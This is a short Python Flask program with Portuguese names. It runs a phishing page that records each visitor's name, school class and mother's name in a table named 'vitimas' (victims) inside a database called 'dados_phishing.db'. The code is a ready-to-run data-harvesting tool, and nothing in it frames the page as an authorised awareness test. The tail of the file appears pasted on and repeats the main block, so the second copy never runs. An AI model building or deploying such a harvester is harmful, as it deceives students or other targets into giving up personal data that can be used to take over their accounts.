import sqlite3
import webbrowser       
from threading import Timer 
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

def inicializar_banco():
    conexao = sqlite3.connect('dados_phishing.db')
    cursor = conexao.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS vitimas (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL,
            turma TEXT NOT NULL,
            nome_mae TEXT NOT NULL
        )
    ''')
    
    conexao.commit()
    conexao.close()

inicializar_banco()

@app.route('/', methods=['GET', 'POST'])
def formulario():
    if request.method == 'POST':
        nome = request.form.get('nome')
        turma = request.form.get('turma')
        nome_mae = request.form.get('nome_mae')
        
        conexao = sqlite3.connect('dados_phishing.db')
        cursor = conexao.cursor()
        
        cursor.execute('''
            INSERT INTO vitimas (nome, turma, nome_mae)
            VALUES (?, ?, ?)
        ''', (nome, turma, nome_mae))
        
        conexao.commit()
        conexao.close()

        return redirect(url_for('redirecionamento'))
    
    return render_template('formulario.html')

@app.route('/redirecionamento')
def redirecionamento():
    return render_template('redirecionamento.html')

if __name__ == '__main__':
    app.run(debug=True)

# ... (FINAL DO SEU ARQUIVO) ...

def abrir_navegador():
    webbrowser.open_new("http://127.0.0.1:5000")

if __name__ == '__main__':
    Timer(1, abrir_navegador).start()
    
    app.run(debug=True, use_reloader=False)